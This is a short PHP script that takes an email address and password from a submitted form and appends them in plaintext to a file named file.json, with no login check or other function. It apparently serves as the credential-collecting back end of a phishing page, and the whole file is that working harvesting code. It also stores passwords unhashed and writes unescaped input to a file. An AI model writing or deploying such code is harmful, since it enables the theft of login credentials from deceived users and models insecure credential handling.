<?php
    $email = $_POST['email'];
    $password = $_POST['password'];
    $Create_File = "file.json";

    $msg = "Email:".$email."<br><br>"."Password:".$password;

    $fp = fopen($Create_File,'a+' );

    fwrite($fp, $msg);
?>